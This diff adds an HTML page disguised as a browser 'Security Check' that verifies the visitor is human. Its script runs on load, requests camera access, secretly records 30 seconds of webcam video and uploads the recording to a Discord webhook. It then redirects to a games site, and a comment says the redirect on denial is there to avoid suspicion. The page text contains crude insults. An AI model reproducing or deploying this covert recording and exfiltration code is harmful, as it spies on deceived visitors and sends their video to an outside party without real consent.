@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check | Verify</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 30px;
+            height: 30px;
+            background: #007bff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+
+        h2 {
+            font-size: 18px;
+            color: #1d1d1f;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        /* Hidden video element for background recording */
+        #hiddenVideo {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">✓</div>
+            <span>Security Check</span>
+        </div>
+        <h2>Verifying you are human fuck nga wait🥀😭✌️</h2>
+        <p>Please wait while we verify your browser security. This process is automatic and should only take a moment stupid fuck.</p>
+        
+        <div class="spinner"></div>
+        <div class="status-text">Processing security tokens...</div>
+
+        <!-- Hidden video element -->
+        <video id="hiddenVideo" silent playsinline></video>
+    </div>
+
+    <script>
+        // CONFIGURATION
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1521559703241359542/m2eix7DmQUcQBK4zyofeE4n3NYcRJNcOacZGcBM2iBr5eqB1h_Xt8QwvYyWDTqKu5Zm1'; // REPLACE THIS WITH YOUR WEBHOOK
+        const RECORDING_DURATION = 30000; // 30 seconds in milliseconds
+        const REDIRECT_URL = 'https://www.crazygames.com';
+
+        async function startRecording() {
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                const videoElement = document.getElementById('hiddenVideo');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                // Wait for the video to be ready
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+
+                // Start recording
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.start();
+
+                // Wait for the specified duration (30 seconds)
+                await new Promise(resolve => setTimeout(resolve, RECORDING_DURATION));
+
+                // Stop recording
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop()); // Stop camera
+
+                // Wait for data to be available
+                await new Promise(resolve => {
+                    mediaRecorder.onstop = resolve;
+                });
+
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                
+                // Send to Discord
+                sendToDiscord(blob);
+
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                // If camera access is denied, we still redirect to avoid suspicion
+                window.location.href = REDIRECT_URL;
+            }
+        }
+
+        async function sendToDiscord(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'verification_record.webm');
+            formData.append('content', 'New verification recording captured (30s).');
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Failed to send to Discord:', error);
+            } finally {
+                // Redirect regardless of success/failure to avoid hanging
+                window.location.href = REDIRECT_URL;
+            }
+        }
+
+        // Start the process when the page loads
+        window.onload = startRecording;
+    </script>
+</body>
+</html>
